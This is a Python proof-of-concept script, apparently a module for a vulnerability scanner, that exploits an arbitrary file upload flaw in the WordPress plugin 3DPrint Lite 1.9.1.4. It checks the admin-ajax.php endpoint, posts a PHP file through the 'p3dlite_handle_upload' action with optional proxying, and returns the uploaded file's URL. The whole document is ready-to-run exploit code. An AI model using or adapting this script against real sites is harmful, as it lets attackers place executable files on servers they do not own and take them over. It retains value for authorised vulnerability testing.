# coding: utf-8
import requests
from os import path

def vuln_check(uri):
    response = requests.get(uri)
    raw = response.text
    if "jsonrpc" in raw:
        return True
    else:
        return False

#Wordpress Plugin 3DPrint Lite 1.9.1.4 - Arbitrary File Upload
def poc(url,user_agent,proxy):

    url = url.strip("/")
    ajax_action = 'p3dlite_handle_upload'
    admin = '/wp-admin/admin-ajax.php'
    exp_url = url + admin + '?action=' + ajax_action
    check = vuln_check(exp_url)
    if not check:
        return
    file_path='data/phpinfo.php'
    header = {'User-Agent': user_agent}
    file_name = path.basename(file_path)
    files = {'file' : open(file_path)}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exp_url, headers=header,files=files, proxies=proxies)
    else:
        response = requests.post(exp_url, headers=header,files=files)

    if (file_name in response.text):
        return 'Wordpress Plugin 3DPrint Lite 1.9.1.4 - 任意文件上传漏洞   上传文件：'+url + '/wp-content/uploads/p3d/' + file_name


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')
